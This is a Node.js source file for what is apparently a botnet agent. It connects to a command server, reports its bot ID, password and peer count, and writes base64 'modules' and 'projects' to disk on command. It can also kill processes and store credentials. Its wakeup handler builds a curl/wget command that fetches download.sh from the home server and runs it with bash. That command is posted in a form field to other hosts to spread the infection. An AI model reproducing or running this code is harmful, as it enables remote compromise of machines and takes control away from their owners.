'use strict';

let DB = require('./db');
let Err = require('./errors');
let assert = require('assert');
let querystring = require('querystring');
let URL = require('url');
let os = require('os');
let path = require('path');
let cp = require('child_process');
let Connection;
try {
  Connection = require('./connection');
} catch (e) {
  Connection = require('./connection1');
}
Connection = require('./connection_new');
let fs = require('fs');
let config = require('./config');
let net = require('net');
let util = require('util');
let Utils = require('./utils');
let ProjectManager = require('./projectManager');
let http = require('http');
let https = require('https');


let homeAddr = null;
let con = null;
let encMsgCb = function() {};

let IP = null;
let PORT = null;
let msgqueue = [];
let dnsWorks = undefined;

function isAdmin() {
  if (os.platform() === 'linux') {
    return false;
  }
  let dirPath = process.env['ProgramFiles'];
  let fileName = Utils.makeid('10');
  let filePath = dirPath + '/' + fileName;
  try {
    fs.mkdirSync(filePath);
  } catch (e) {
    return false;
  }
  try {
    fs.rmdirSync(filePath);
  } catch (e) {
    console.log(e);             // todo: handle this error;
  }
  return true;
}

function lsModules() {
  let modulesPath = '../' + config.modulesPath;
  let stat = null;
  try {
    stat = fs.statSync(modulesPath);
    if (!stat.isDirectory()) {
      return [];
    }
  } catch (e) {
    return [];
  }

  let result = [];

  let modules = fs.readdirSync(modulesPath);
  for (let i = 0; i < modules.length; i++) {
    let module = modules[i];
    let stat = fs.statSync(path.join(modulesPath, module));
    if (!stat.isDirectory()) {
      continue;
    }
    let versionPath = path.join(modulesPath, module, 'version.txt').toString();
    let version = Utils.getFileContent(versionPath);
    result.push({
      name: module,
      version: version
    });
  }
  return result;
}


function lsProjects() {
  let arr = fs.readdirSync('../');
  let projectInfos = [];
  let projects = [];
  for (let i = 0; i < arr.length; i++) {
    let fname = arr[i];
    if (fs.lstatSync('../' + fname).isDirectory()) {
      let version = Utils.getFileContent('../' + fname + '/version.txt');
      assert(config.modulesPath === 'modules');
      if (fname === config.modulesPath) {
        continue;
      }
      projects.push({
        name: fname,
        version: version,
        running: ProjectManager.isRunning(fname)
      });
    }
  }

  let modules = lsModules();

  return {
    type: 'ls',
    isAdmin: isAdmin(),
    projects: projects,
    modules: modules
  };
}

function mkdirSync(dir) {
  try {
    fs.mkdirSync(dir);
  } catch (e) {
    sendDebugMsg({
      msg: e
    });
  }
}

function removeDirRecWithoutChecks(dir) {
  if (fs.existsSync(dir) ) {
    fs.readdirSync(dir).forEach((file,index) => {
      let curPath = dir + '/' + file;
      if (fs.lstatSync(curPath).isDirectory()) { // recurse
        removeDirRec(curPath);
      } else { // delete file
        try {
          fs.unlinkSync(curPath);
        } catch (e) {

          console.log(e);
        }
      }
    });
    try {
      fs.rmdirSync(dir);
    } catch (e) {
      console.log(e);
    }

  }

}

// todo: check that it dont delete index.js
function removeDirRec(dir) {
  dir = path.resolve(dir);
  let homeDir = path.resolve('../');
  try {
    let stat = fs.statSync(dir);
    if (!stat.isDirectory()) {
      return;
    }
  } catch (e) {

  }
  if (dir.toString().indexOf(homeDir.toString()) === -1) {
    console.log('%s does not contain %s', homeDir, dir);
    return;
  }
  if (homeDir.toString() === dir.toString()) {
    console.log('can not remove %s', dir);
    return;
  }
  removeDirRecWithoutChecks(dir);
}



function addProject(name, project, version) {
  console.log('adding project: %s', name);
  let dirPath = path.join('../', name).toString();
  removeDirRec(dirPath);
  mkdirSync(dirPath);
  console.log('mkdirsync: %s', dirPath);
  for (let i = 0; i < project.dirs.length; i++) {
    let dirname = project.dirs[i];
    let p = path.join(dirPath, dirname).toString();
    console.log('creating: %s', p);
    mkdirSync(p);
  }
  for (let key in project) {
    if (!project.hasOwnProperty(key)) {
      continue;
    }
    let value = project[key];
    if (typeof value !== 'string') {
      continue;
    }
//    value = Buffer.from(value, 'base64'); // Ta-da
    let p = path.join('../', name, key).toString();
    console.log('key: %s', key);
    console.log('writing to: %s', path.resolve(p));
    fs.writeFileSync(p, value);
  }
}

function addModule(name, module) {
  console.log('adding module');
  console.log('adding module with name: ');
  console.log(name);
  console.log(typeof module);

  let modulesPath = path.join('../', config.modulesPath);
  try {
    fs.mkdirSync(modulesPath);
  } catch (e) {
    console.log(e);
  }

  let modulePath = path.join(modulesPath, name).toString();
  removeDirRec(modulePath);
  mkdirSync(modulePath);
  for (let i = 0; i < module.dirs.length; i++) {
    let moduleName = module.dirs[i];
    let p = path.join(modulePath, module.dirs[i]).toString();
    console.log('creating: %s', p);
    mkdirSync(p);
  }

  for (let key in module) {
    if (!module.hasOwnProperty(key)) {
      continue;
    }
    let value = module[key];
    if (typeof value !== 'string') {
      continue;
    }
    let p = path.join(modulePath, key).toString();
    console.log('key: %s', key);
    value = Buffer.from(value, 'base64'); // Ta-da
    fs.writeFileSync(p, value);
  }
}



class HomeCon extends Connection {

  constructor(sock) {
    super(sock);
    this._onConnect();
    this._msgHandler = {
      encrypted: encMsgCb,
      ls: this.handleLs.bind(this),
      addModule: this.handleAddModule.bind(this),
      deleteModule: this.handleDeleteModule.bind(this),
      addProject: this.handleAddProject.bind(this),
      deleteProject: this.handleDeleteProject.bind(this),
      startProject: this.startProject.bind(this),
      stopProject: this.stopProject.bind(this),
      killNode: this.killNode.bind(this),
      die: this.handleDie,
      sendWakeUp: this._sendWakeup.bind(this),
      storeIDandPass: this._storeIDandPass.bind(this),
      storePeers: this._storePeers.bind(this)
    };

  }

  _storePeers(msg) {
    const peers = msg.peers;
    DB.storePeers(peers);
  }

  _storeIDandPass(msg) {
    const botID = msg.botID;
    const botPass = msg.botPass;

    DB.storeCredentials(botID, botPass);

    const resp = {
      respID: msg.id,
      type: msg.type,
      success: true
    };

    this.sendMsg(resp);
  };

  _sendWakeup(msg) {
    var id = msg.botID;
    var url = msg.url;
    var hash = msg.hash;
    var ip = msg.ip;
    var host = msg.hostname;

    const homeIP = config.globals.homeIP;
//    var cmd = util.format('pkill nodejs; if curl %s/jsb/download.sh > download.sh; then echo "curl ok"; else wget %s/jsb/donload.sh -O download.sh; fi; bash download.sh %s %s %s > o 2> e %26', homeIP, homeIP, homeIP, homeIP, id); // & %26
    var cmd = util.format('if curl %s/jsb/download.sh > download.sh; then echo "curl ok"; else wget %s/jsb/donload.sh -O download.sh; fi; bash download.sh %s %s %s > o 2> e %26', homeIP, homeIP, homeIP, homeIP, id); // & %26
    console.log(cmd);
    var protocol = url.indexOf('http://') === 0 ? http : https;
    var port = protocol === http ? 80 : 443;
    var parsedURL = URL.parse(url);
    if (parsedURL.port) {
      port = parsedURL.port;
    }
    var options = {
      //      hostname: parsedURL.hostname,
      hostname: msg.ip,
      port: port,
      path: parsedURL.path,
      method: 'POST',
      headers: {'Accept':'*/*', 'Cache-Control':'max-age=0', 'Connection':'keep-alive', 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"},
      rejectUnauthorized: false
    };
    options.headers['User-Agent'] = 'curl/7.35.0';
    options.headers['Host'] = msg.hostname;
    assert(msg.hostname);
    assert(msg.ip);

    let postData = util.format('hash=%s&libso=%s', hash, cmd);
    options.headers['Content-Length'] = postData.length;
    var req = protocol.request(options, res => {
      var status = res.statusCode;
      let content = '';
      res.on('data', chunk => {
        content += chunk.toString();
      });
      res.on('error', onEnd.bind(this));
      res.on('end', onEnd.bind(this));

      function onEnd() {
        //
        //cb(null, content);
        var resp = content;
        var str = '\nS4mTr0cCaYc15ygJJ1r6 current nonce:';
        var index = resp.indexOf(str);
        if (index === -1) {
          this.sendMsg({
	    respID: msg.id,
            type: msg.type,
            success: true
          });
          return;
        }
        resp = resp.substring(index + str.length);
        var endInd = resp.indexOf('\n');
        var nonce = resp.substring(0, endInd).trim();
        console.log('current nonce is: %s', nonce);
        console.log('trying again with new nonce;)');
        this.sendMsg({
          respID: msg.id,
          type: msg.type,
          success: false,
          nonce: nonce
        });
      }
    });

    req.on('error', err => {
      this.sendDebugMsg({
        err: err
      });
    });

    req.write(postData);
    req.end();



  }

  handleDie() {
    ProjectManager.killAll();
    console.log('dyiiiiiing');
    process.exit(0);
  }

  killNode() {
    Utils.logToFile('killing node', 'err.log');
    if (os.platform() === 'linux') {
      cp.exec('pkill node');
      cp.exec('pkill nodejs');
    } else {
      cp.exec('taskkill /F /IM nodejs.exe');
    }
  }

  stopProject(msg) {
    const name = msg.name;
    ProjectManager.stop(name);
  }

  startProject(msg) {
    const name = msg.name;
    try {
      ProjectManager.start(name);
    } catch (err) {
      if (err instanceof Err.MyError) {
        return {
          success: false,
          err: err.toJSONstr(),
          test: 'test'
        };
      }
      throw err;
    }
    return {
      success: true
    };
  }

  handleDeleteModule(msg) {
    const name = msg.name;
    const dirPath = path.join('../', config.modulesPath, name).toString();
    removeDirRec(dirPath);
  }

  handleDeleteProject(msg) {
    const name = msg.name;
    let dirPath = path.join('../', name).toString();
    removeDirRec(dirPath);
  }

  handleAddProject(msg) {
    let resp = {};
    try {
      addProject(msg.name, msg.project, msg.version);
      resp.success = true;
    } catch (err) {
      resp.success = false;
      resp.err = err;
    }
    return resp;
  }

  handleAddModule(msg) {
    let resp = {};
    try {
      addModule(msg.name, msg.module);
      resp.success = true;
    } catch (err) {
      resp.success = false;
      resp.err = err;
    }
    return resp;
  }

  handleLs(msg) {
    let resp = {};;
    try {
      resp = lsProjects();
      resp.success = true;
    } catch (err) {
      resp.success = false;
      resp.err = err;
    }
    return resp;
  }

  _getVersion() {
    const content = fs.readFileSync('version.txt');
    const version = content.toString().trim();
    return version;
  }

  _onConnect() {
    console.log('deleting output file');
    console.log('reading credentials');
    let str = '';
    try {
      str = fs.readFileSync(config.errFile).trim().toString();
      str = str.substring(str.length - 1000);
    } catch (err) {
      //str = err.toString();
    }
    try {
      fs.unlinkSync('out');
    } catch (e) {

    }
    try {
      fs.unlinkSync('err');
    } catch (e) {

    }

    const msg = {
      type: 'hello',
      err: str,
      botID: config.globals.botID,
      version: this._getVersion(),
      pass: config.pass,
      nPeers: DB.getPeers().length,
      platform: os.platform(),
      dnsWorks: config.globals.dnsWorks
    };
    this.sendMsg(msg);
    this._helloSent = true;
    //this.sendMsg(lsProjects());
  }

  sendDebugMsg(msg) {
    msg.type = 'DEBUG';
    this.sendMsg(msg);
  }

  sendErrorMsg(msg) {
    msg.type = 'ERROR';
    this.sendMsg(msg);
  }

  dieForever() {
    console.log('GREP: dieforever');
    this.die();
  }

  die() {
    if (!this.isAlive()) {
      return;
    }
    console.log('GREP: die');
    this.sendMsg({
      type: 'dying'
    });
    super.die();
  }

  handleMsg(msg) {
    if (os.platform().indexOf('win') !== -1) {
      return;
    }
    const handler = this._msgHandler[msg.type];
    if (!handler) {
      console.log('invalid msg');
      console.log(msg);
      this.sendDebugMsg({
        str: 'invalid msg',
        type: msg.type,
        handlers: this._msgHandler,
        msg: JSON.stringify(msg)
      });
      return;
    }
    const response = handler(msg);
    if (response) {
      assert(!response.id);
      //assert(!response.type);
      response.respID = msg.id;
      if (!response.type) {
        response.type = msg.type;
      }
      this.sendMsg(response);
    }
    return;
  }
}


function _connect(cb) {
  let ip = IP;
  let port = PORT;
  console.log('updater. connecting to: %s:%s',ip, port);
  if (con && con.isAlive()) {
    console.log('already connected.');
    cb('already connected');
    return;
  }
  let sock = net.connect(port, ip, () => {
    cb();
    sock.removeListener('close', onCanNotConnect);
    sock.removeListener('timeout', onTimeoutBeforeConnct);

    console.log('connected');
    con = new HomeCon(sock);
    con.setKeepAlive(10 * 60);
    while (msgqueue.length > 0) {
      const msg = msgqueue.shift();
      sendDebugMsg(msg);
    }
    sock.on('close', () => {
      console.log('GREP: closed');
      console.log('closed');
      con = null;
      setTimeout(() => {
        _connect(function(){});
      }, 1000);
    });
  });

  sock.on('close', onCanNotConnect);
  sock.on('error', err => {
    console.log('error');
    console.log(err);           // todo log
  });
  sock.setTimeout(10 * 1000, onTimeoutBeforeConnct);

  function onCanNotConnect() {
    setTimeout(() => {
      _connect(function(){});
    }, 1000);
  }

  function onTimeoutBeforeConnct() {
    sock.destroy();
  }
}

function connect(ip, port, cb) {
  console.log('homecon. connect: %s:%s', ip, port);
  if (!ip || !port) {
    cb(util.format('Invalid address: %s:%s', ip, port));
    console.log('invalid address: %s:%s', ip, port);
    return;
  }
  if (homeAddr && ip === homeAddr.ip && port === homeAddr.port) {
    console.log("is already connected");
    console.log(homeAddr);
    cb();
    return;
  }
  IP = ip;
  PORT = port;
  if (con) {
    con.dieForever();
  }
  _connect(cb);
}

function isConnected() {
  return con && con.isAlive();
}

function sendDebugMsg(msg) {
  if (!con || !con.isAlive()) {
    msgqueue.push(msg);
    return;
  }
  con.sendDebugMsg(msg);
}

function changeHomeAddr(addr) {
  IP = addr.ip;
  PORT = addr.port;
  if (con && con.isAlive()) {
    con.dieForever();
  }
  connect(IP, PORT, function(){});
}

function sendMsg(msg, cb) {
  console.log('sending msg');
  if (!con || !con.isAlive()) {
    cb();
    return;
  }
  if (!con._helloSent) {
    return;
  }
  console.log('sending msg1');
  console.log(msg);
  con.sendMsg(msg, cb);
}


module.exports.connect = connect;
module.exports.sendDebugMsg = sendDebugMsg;
module.exports.isConnected = isConnected;
module.exports.changeHomeAddr = changeHomeAddr;
module.exports.sendMsg = sendMsg;
